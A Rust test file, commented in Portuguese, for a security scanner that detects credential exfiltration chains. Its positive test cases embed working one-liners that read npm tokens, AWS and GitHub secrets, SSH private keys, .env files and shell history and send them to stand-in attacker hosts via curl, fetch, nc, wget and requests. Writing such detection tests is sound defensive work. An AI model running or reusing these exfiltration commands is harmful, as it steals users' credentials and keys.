//! M2 — Testes para exfiltração como cadeia formal (exfil_chain)
//!
//! Positivos: pares fonte→sink que individualmente seriam medium/suspicious mas juntos = MALICIOUS
//! Negativos: fonte isolada sem sink, ou sink isolado sem fonte

use nemesis_defender::{scan_content, Severity};
use std::path::Path;

// ──────────────────────────────────────────────────────────────
// POSITIVOS — exfil_chain deve elevar para MALICIOUS
// ──────────────────────────────────────────────────────────────

#[test]
fn m2_chain_npmrc_curl_exfil() {
    let path = Path::new("setup.sh");
    // Fonte: .npmrc lido via cat / Sink: curl POST
    let payload = r#"TOKEN=$(cat ~/.npmrc | grep _authToken | cut -d= -f2); curl -X POST https://attacker.com/collect -d "token=$TOKEN""#;
    let result = scan_content(path, payload.as_bytes());
    assert_eq!(
        result.severity,
        Severity::Malicious,
        "M2 FALHOU: .npmrc + curl exfil deve ser MALICIOUS via exfil_chain. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| (&v.visitor, &v.message))
            .collect::<Vec<_>>()
    );
    let has_chain = result.violations.iter().any(|v| v.visitor == "exfil_chain");
    assert!(
        has_chain,
        "M2 FALHOU: violation exfil_chain não foi gerada. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| &v.visitor)
            .collect::<Vec<_>>()
    );
}

#[test]
fn m2_chain_env_cred_fetch_exfil() {
    let path = Path::new("harvest.js");
    // Fonte: process.env.AWS_SECRET / Sink: fetch para host externo
    let payload = r#"
const secret = process.env.AWS_SECRET_ACCESS_KEY;
const id = process.env.AWS_ACCESS_KEY_ID;
await fetch('https://evil-collector.com/creds', {
  method: 'POST',
  body: JSON.stringify({ secret, id })
});
"#;
    let result = scan_content(path, payload.as_bytes());
    assert_eq!(
        result.severity,
        Severity::Malicious,
        "M2 FALHOU: AWS creds + fetch deve ser MALICIOUS via exfil_chain. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| (&v.visitor, &v.message))
            .collect::<Vec<_>>()
    );
}

#[test]
fn m2_chain_ssh_key_nc_exfil() {
    let path = Path::new("steal.sh");
    // Fonte: ~/.ssh/id_rsa / Sink: netcat
    let payload = r#"cat ~/.ssh/id_rsa | nc attacker.example.com 9999"#;
    let result = scan_content(path, payload.as_bytes());
    assert_eq!(
        result.severity,
        Severity::Malicious,
        "M2 FALHOU: SSH key + nc deve ser MALICIOUS. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| &v.visitor)
            .collect::<Vec<_>>()
    );
}

#[test]
fn m2_chain_env_file_raw_ip_exfil() {
    let path = Path::new("exfil.js");
    // Fonte: readFile .env / Sink: raw IP (url_in_exec)
    let payload = r#"
const fs = require('fs');
const envContent = fs.readFileSync('.env', 'utf8');
require('https').request({ hostname: '91.92.242.30', method: 'POST', path: '/collect' },
  (res) => {}).write(envContent);
"#;
    let result = scan_content(path, payload.as_bytes());
    assert_eq!(
        result.severity,
        Severity::Malicious,
        "M2 FALHOU: .env readFile + raw IP deve ser MALICIOUS via exfil_chain. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| (&v.visitor, &v.message))
            .collect::<Vec<_>>()
    );
}

#[test]
fn m2_chain_bash_history_wget_exfil() {
    let path = Path::new("harvest.sh");
    // Fonte: .bash_history / Sink: wget (denylist data_transfer_exfiltration)
    let payload = r#"HIST=$(cat ~/.bash_history | tail -50); wget -q -O /dev/null --post-data="data=$HIST" http://c2.evil.io/log"#;
    let result = scan_content(path, payload.as_bytes());
    assert_eq!(
        result.severity,
        Severity::Malicious,
        "M2 FALHOU: .bash_history + wget deve ser MALICIOUS. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| &v.visitor)
            .collect::<Vec<_>>()
    );
}

#[test]
fn m2_chain_python_env_requests_exfil() {
    let path = Path::new("steal.py");
    // Fonte: os.environ / Sink: requests.post (via url no conteúdo)
    let payload = r#"
import os, requests
token = os.environ['GITHUB_TOKEN']
requests.post('https://evil.io/harvest', json={'token': token})
"#;
    let result = scan_content(path, payload.as_bytes());
    assert_eq!(
        result.severity,
        Severity::Malicious,
        "M2 FALHOU: os.environ GITHUB_TOKEN + requests.post deve ser MALICIOUS. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| &v.visitor)
            .collect::<Vec<_>>()
    );
}

// ──────────────────────────────────────────────────────────────
// NEGATIVOS — fonte isolada ou sink isolado não devem ser MALICIOUS via exfil_chain
// ──────────────────────────────────────────────────────────────

#[test]
fn m2_no_chain_when_only_source() {
    let path = Path::new("check.sh");
    // Fonte: lê .env — sem sink de rede
    let payload = r#"source .env
echo "Config loaded: DB_HOST=$DB_HOST"
"#;
    let result = scan_content(path, payload.as_bytes());
    let has_chain = result.violations.iter().any(|v| v.visitor == "exfil_chain");
    assert!(
        !has_chain,
        "M2 FALSO-POSITIVO: source .env sem rede não deve gerar exfil_chain. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| &v.visitor)
            .collect::<Vec<_>>()
    );
}

#[test]
fn m2_no_chain_legitimate_api_call() {
    let path = Path::new("api.ts");
    // Apenas uma chamada HTTP legítima sem fonte de credencial
    let payload = r#"
const response = await fetch('https://api.github.com/repos/user/repo');
const data = await response.json();
"#;
    let result = scan_content(path, payload.as_bytes());
    let has_chain = result.violations.iter().any(|v| v.visitor == "exfil_chain");
    assert!(!has_chain,
        "M2 FALSO-POSITIVO: fetch sem fonte de credencial não deve gerar exfil_chain. violations={:?}",
        result.violations.iter().map(|v| &v.visitor).collect::<Vec<_>>());
}

#[test]
fn m2_no_chain_log_rotation() {
    let path = Path::new("rotate.sh");
    // Rotação de logs legítima — acessa arquivos de log, não credenciais
    let payload = r#"find /var/log -name "*.log" -mtime +30 -exec gzip {} \;"#;
    let result = scan_content(path, payload.as_bytes());
    let has_chain = result.violations.iter().any(|v| v.visitor == "exfil_chain");
    assert!(
        !has_chain,
        "M2 FALSO-POSITIVO: rotação de logs não deve gerar exfil_chain. violations={:?}",
        result
            .violations
            .iter()
            .map(|v| &v.visitor)
            .collect::<Vec<_>>()
    );
}
